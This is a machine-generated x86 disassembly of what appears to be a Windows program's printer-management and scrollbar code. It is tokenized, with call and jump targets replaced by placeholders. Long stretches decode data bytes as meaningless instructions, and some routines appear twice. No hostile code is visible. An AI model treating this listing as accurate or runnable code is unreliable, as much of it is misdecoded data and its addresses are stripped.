add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x50 ] dh
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x50 ] al
jb r-xdata
jb r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x408d7265
adc bl ch
add [ edx - 0x80 ] eax
cmp ah [ eax ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x52 ] ch
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x180040 ] dl
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
jb r-xdata
jb r-xdata
je r-xdata
inc edx
mov esi edx
jmp r-xdata
cmp [ edx ] 0x20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ecx
outsb
je r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_424fb0
retn
add [ eax + 0x50 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x50 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov cl [ edx ]
test cl cl
je r-xdata
add [ eax + edx + 0xc0040 ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
push ecx
jb r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
retn 0x8
outsb
je r-xdata
jb r-xdata
add [ eax ] al
push cs
push esp
push eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
pop ebp
jb r-xdata
call sub_404070
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42521b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404070
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404284
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404070
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404070
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_40344c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425222
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404284
je r-xdata
sub_42507c
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_4250cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x51
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
push ecx
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
add [ eax + edx + 0xc0040 ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
retn 0x8
outsb
je r-xdata
jb r-xdata
add [ eax ] al
push cs
push esp
push eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
pop ebp
jb r-xdata
call sub_404070
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42521b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404070
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404284
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404070
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404070
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_40344c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425222
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404284
je r-xdata
sub_425148
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404070
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404070
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4251a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42521b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404070
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404284
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425222
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404284
je r-xdata
sub_42522c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_425268
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_4252e4
mov eax esi
call sub_425ba4
mov eax esi
call sub_425be0
mov eax [ esi + 0x4 ]
call sub_403128
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_425480
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4252e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425402
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425409
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_425410
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_41d520
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42574c
push eax
mov eax esi
call sub_425764
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_404338
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_41d520
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x8 ]
call sub_4250b0
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_41d520
sub_425410
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_425475
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42547c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x8 ]
call sub_4250b0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x4 ]
call sub_4250b0
jmp r-xdata
sub_425480
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_425410
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_4254b4
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_4254f0
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_425727
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_425410
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_425be0
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_4254b4
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_4252e4
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_425764
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425148
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408a84
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_404070
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42572e
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403e9c
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4251a8
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_4254b4
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_425764
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425993
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_425950
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42593f
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42599a
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403e9c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42507c
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425148
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_404070
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425148
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408a84
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42507c
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_4259a4
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425b81
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4079b8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_425b41
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42507c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_425764
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40c714
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x41c ]
call sub_4250b0
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404338
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x8 ]
call sub_404338
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4254f0
call sub_403960
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_404070
mov edx [ ebp - 0x420 ]
pop eax
call sub_407c54
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b88
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403e9c
retn
sub_425ba4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40cc70
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403128
inc edi
dec ebx
jne r-xdata
sub_425c0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425c3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c44
retn
mov eax [ rw-data ]
call sub_403128
sub_425c50
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425c84
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425cac
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_425f2e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425f55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f5c
retn
sub_425f70
mov esp 0x425f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
pop edi
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
std
dec [ ebp - 0x17affbba ]
adc al 0xff
std
dec [ ebx + 0x74db84c6 ]
psubsb mm6 [ ecx ]
aam 0xfd
jmp [ edi + ecx * 4 + 0x5 ]
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pushad
inc edx
add [ eax + eax ] bl
add [ eax ] al
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cmp al 0x60
inc edx
add [ eax + 0x60 ] al
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
push esi
test dl dl
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x60b40042 ] al
inc edx
add al al
pushad
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x20 ] si
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
std
